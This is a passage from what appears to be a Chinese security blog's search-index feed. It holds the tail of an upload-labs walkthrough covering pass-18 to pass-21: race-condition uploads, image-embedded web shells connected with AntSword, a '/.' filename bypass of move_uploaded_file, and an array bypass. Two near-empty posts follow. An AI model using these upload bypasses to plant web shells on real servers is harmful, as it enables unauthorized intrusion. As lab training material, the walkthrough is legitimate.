class="built_in">str</span>(html.text)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>等到输出ok的时候就可以访问，用蚁剑连接的时候访问a.php就行了<br><strong>ps：</strong>条件竞争可能不成功，需要多试几次</p><h4 id="pass-19（条件竞争）"><a href="#pass-19（条件竞争）" class="headerlink" title="pass-19（条件竞争）"></a>pass-19（条件竞争）</h4><p>此关和<strong>pass-18</strong>类似，只不过本关需要上传的是图片码而非木马，故先制作图片码，<strong>shell.php</strong>使用<strong>pass-18</strong>的木马即可。其余和<strong>pass-18</strong></p><p>相仿，不再赘述。</p><h4 id="pass-20（-绕过）"><a href="#pass-20（-绕过）" class="headerlink" title="pass-20（&#x2F;.绕过）"></a>pass-20（&#x2F;.绕过）</h4><p>本关上传文件名可控，由于<code>move_uploaded_file()</code>有一个特性，会忽略掉文件末尾的 <code>/.</code>所以直接在保存文件名称的时候在最后加上<code>/.</code><br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272316362.png" alt="image-20240727231610216"></p><p>连接的时候用<code>upload-19.php</code>就行</p><h4 id="pass-21（数组绕过）"><a href="#pass-21（数组绕过）" class="headerlink" title="pass-21（数组绕过）"></a>pass-21（数组绕过）</h4><p>本关包含了后缀名验证、<strong>MIME</strong>验证以及数组绕过<br><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272339502.png" alt="image-20240727233907354"></p><p>原理我也没搞太懂，先记录下来</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>文件上传分为两大类：<strong>前端验证</strong>和<strong>后端验证</strong>。<br><strong>前端验证</strong>的安全性远远低于<strong>后端验证</strong>，而后端验证又分为<strong>白名单</strong>和<strong>黑名单</strong>，<strong>白名单</strong>的安全性大于<strong>黑名单</strong>，下图为文件上传思维导图</p><p><img src="https://typora-666.oss-cn-shanghai.aliyuncs.com/imaes/202407272342961.png" alt="image-20240727234236167"></p><p>自己写代码的时候注意多使用白名单过滤，以免留多的后门。</p><p><strong>完结撒花</strong></p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 基本漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nacos漏洞</title>
      <link href="/2024/07/18/Nacos%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/07/18/Nacos%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"><p>test</p></div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/07/17/test/"/>
      <url>/2024/07/17/test/</url>
      
        <content type="html"><![CDATA[<div id="postchat_postcontent"></div>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
